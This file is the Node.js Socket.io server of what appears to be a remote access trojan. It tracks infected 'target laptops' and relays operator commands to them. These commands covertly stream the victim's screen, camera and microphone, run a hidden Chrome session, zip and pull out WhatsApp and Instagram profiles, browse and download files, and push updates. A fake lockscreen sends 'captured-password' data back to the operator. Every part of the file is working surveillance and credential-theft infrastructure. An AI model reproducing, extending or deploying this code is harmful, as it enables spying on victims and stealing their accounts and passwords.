const express = require('express');
const app = express();
const http = require('http');
const path = require('path');
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 });

// Serve Admin Dashboard from public folder
app.use(express.static(path.join(__dirname, 'public')));

let clients = {}; // Keep track of all connected target laptops

io.on('connection', (socket) => {
  
  // A target laptop (Electron EXE) connects automatically and registers itself
  socket.on('register-client', (data) => {
    let hostname = typeof data === 'string' ? data : data.name;
    let type = data.type || 'screen';
    let version = data.version || '1.0.0';
    let apt = data.apt || 'apt-1';
    console.log('Target Laptop Connected:', hostname, socket.id, 'Type:', type, 'APT:', apt);
    clients[socket.id] = { id: socket.id, name: hostname, type: type, version: version, apt: apt };
    // Tell the admin dashboard to update the UI
    io.emit('client-list', clients);
  });

  socket.on('client-error', (err) => {
    console.error(`Error from client ${socket.id}:`, err);
    // Forward the error to all admins so it displays on the dashboard
    socket.broadcast.emit('target-error', { targetId: socket.id, error: err });
  });

  // Admin dashboard requests the current list of online laptops
  socket.on('get-clients', () => {
    socket.emit('client-list', clients);
  });

  // Admin explicitly requests Screen
  socket.on('request-screen', (targetClientId) => {
    io.to(targetClientId).emit('request-screen', socket.id);
  });

  socket.on('request-screen-safe', (targetClientId) => {
    io.to(targetClientId).emit('request-screen-safe', socket.id);
  });

  // Admin explicitly requests Screen + Mic
  socket.on('request-screen-mic', (targetClientId) => {
    io.to(targetClientId).emit('request-screen-mic', socket.id);
  });

  // Admin explicitly requests Camera
  socket.on('request-camera', (targetClientId) => {
    io.to(targetClientId).emit('request-camera', socket.id);
  });

  // Admin explicitly requests Mic only
  socket.on('request-mic', (targetClientId) => {
    io.to(targetClientId).emit('request-mic', socket.id);
  });

  // Request Chrome List
  socket.on('request-chrome-list', (targetClientId) => {
    io.to(targetClientId).emit('request-chrome-list', socket.id);
  });

  socket.on('chrome-list', (data) => {
    io.to(data.adminId).emit('chrome-list', { targetId: socket.id, sources: data.sources });
  });

  // Request Chrome Window
  socket.on('request-chrome-window', (data) => {
    io.to(data.targetId).emit('request-chrome-window', { adminId: socket.id, sourceId: data.sourceId });
  });

  // Request WhatsApp
  socket.on('request-whatsapp', (targetClientId) => {
    io.to(targetClientId).emit('request-whatsapp', socket.id);
  });

  // Hidden Chrome
  socket.on('request-chrome-profiles', (targetClientId) => {
    io.to(targetClientId).emit('request-chrome-profiles', socket.id);
  });

  socket.on('chrome-profiles-list', (data) => {
    io.to(data.adminId).emit('chrome-profiles-list', { targetId: socket.id, profiles: data.profiles });
  });

  socket.on('request-hidden-chrome', (data) => {
    if (typeof data === 'string') {
        io.to(data).emit('request-hidden-chrome', socket.id);
    } else {
        io.to(data.targetId).emit('request-hidden-chrome', { adminId: socket.id, profileName: data.profileName });
    }
  });

  socket.on('hidden-chrome-frame', (data) => {
    io.to(data.adminId).emit('hidden-chrome-frame', data.frame);
  });

  // Zip Profile
  socket.on('request-zip-whatsapp', (data) => {
    if (typeof data === 'string') {
        io.to(data).emit('request-zip-whatsapp', socket.id);
    } else {
        io.to(data.targetId).emit('request-zip-whatsapp', { adminId: socket.id, profileName: data.profileName });
    }
  });

  socket.on('whatsapp-zip-ready', (data) => {
    io.to(data.adminId).emit('whatsapp-zip-ready', data);
  });

  socket.on('whatsapp-zip-error', (data) => {
    io.to(data.adminId).emit('whatsapp-zip-error', data);
  });

  // Zip Profile Instagram
  socket.on('request-zip-instagram', (data) => {
    if (typeof data === 'string') {
        io.to(data).emit('request-zip-instagram', socket.id);
    } else {
        io.to(data.targetId).emit('request-zip-instagram', { adminId: socket.id, profileName: data.profileName });
    }
  });

  socket.on('instagram-zip-ready', (data) => {
    io.to(data.adminId).emit('instagram-zip-ready', data);
  });

  socket.on('instagram-zip-error', (data) => {
    io.to(data.adminId).emit('instagram-zip-error', data);
  });

  socket.on('hidden-chrome-action', (data) => {
    io.to(data.targetId).emit('hidden-chrome-action', data.action);
  });

  socket.on('stop-hidden-chrome', (targetClientId) => {
    io.to(targetClientId).emit('stop-hidden-chrome');
  });

  socket.on('whatsapp-error', (data) => {
    io.to(data.adminId).emit('whatsapp-error', data.error);
  });

  // Admin explicit stops
  socket.on('stop-screen', (targetClientId) => {
    io.to(targetClientId).emit('stop-screen');
  });

  socket.on('stop-screen-safe', (targetClientId) => {
    io.to(targetClientId).emit('stop-screen-safe');
  });

  socket.on('stop-camera', (targetClientId) => {
    io.to(targetClientId).emit('stop-camera');
  });

  socket.on('stop-mic', (targetClientId) => {
    io.to(targetClientId).emit('stop-mic');
  });

  // Admin clicks to stop watching entirely (fallback)
  socket.on('stop-watch', (targetClientId) => {
    io.to(targetClientId).emit('stop-watch');
  });

  // Relay screen frames from client to admin
  socket.on('screen-frame', (data) => {
    io.to(data.targetId).emit('screen-frame', { frame: data.frame, from: socket.id });
  });

  socket.on('screen-safe-frame', (data) => {
    io.to(data.adminId).emit('screen-safe-frame', data.frame);
  });

  // WebRTC Signaling relays for Camera/Mic clients
  socket.on('offer', (data) => {
    io.to(data.targetId).emit('offer', { offer: data.offer, from: socket.id });
  });

  socket.on('answer', (data) => {
    io.to(data.targetId).emit('answer', { answer: data.answer, from: socket.id });
  });

  socket.on('ice-candidate', (data) => {
    io.to(data.targetId).emit('ice-candidate', { candidate: data.candidate, from: socket.id });
  });

  // File Browser Relays
  socket.on('request-files', (data) => {
    io.to(data.targetId).emit('request-files', { from: socket.id, path: data.path });
  });

  socket.on('file-list', (data) => {
    io.to(data.targetId).emit('file-list', data);
  });

  socket.on('file-list-progress', (data) => {
    io.to(data.targetId).emit('file-list-progress', data);
  });

  socket.on('open-file', (data) => {
    io.to(data.targetId).emit('open-file', data.path);
  });

  socket.on('download-file', (data) => {
    io.to(data.targetId).emit('download-file', { path: data.path, adminId: socket.id });
  });

  socket.on('download-error', (data) => {
    io.to(data.adminId).emit('download-error', data.error);
  });

  socket.on('download-start', (data) => {
    io.to(data.adminId).emit('download-start', data);
  });

  socket.on('request-chunk', (data) => {
    io.to(data.targetId).emit('request-chunk', { ...data, adminId: socket.id });
  });

  socket.on('download-chunk', (data) => {
    io.to(data.adminId).emit('download-chunk', data);
  });

  // Admin Push Update to Client
  socket.on('push-update-start', (data) => {
    io.to(data.targetId).emit('push-update-start', data);
  });
  
  socket.on('push-update-chunk', (data) => {
    io.to(data.targetId).emit('push-update-chunk', data);
  });

  socket.on('push-update-end', (data) => {
    io.to(data.targetId).emit('push-update-end', data);
  });

  socket.on('remote-action', (data) => {
    io.to(data.targetId).emit('remote-action', data.action);
  });

  socket.on('force-stop-all', (targetId) => {
    io.to(targetId).emit('force-stop-all');
  });

  socket.on('request-fake-lockscreen', (targetId) => {
    io.to(targetId).emit('request-fake-lockscreen', socket.id);
  });

  socket.on('captured-password', (data) => {
    io.to(data.targetId).emit('captured-password', data.password);
  });

  socket.on('disconnect', () => {
    if (clients[socket.id]) {
      console.log('Target Laptop Disconnected:', clients[socket.id].name);
      delete clients[socket.id];
      io.emit('client-list', clients);
    } else {
      // It was an admin who disconnected. Stop all streams on all targets for safety.
      console.log('Admin Disconnected. Force stopping all active streams.');
      io.emit('force-stop-all');
    }
  });
});

const PORT = 3000;
server.listen(PORT, () => {
  console.log(`\n=============================================`);
  console.log(`✅ Admin Server Running!`);
  console.log(`🌍 Open Chrome on your laptop and go to:`);
  console.log(`   http://localhost:${PORT}`);
  console.log(`=============================================\n`);
});
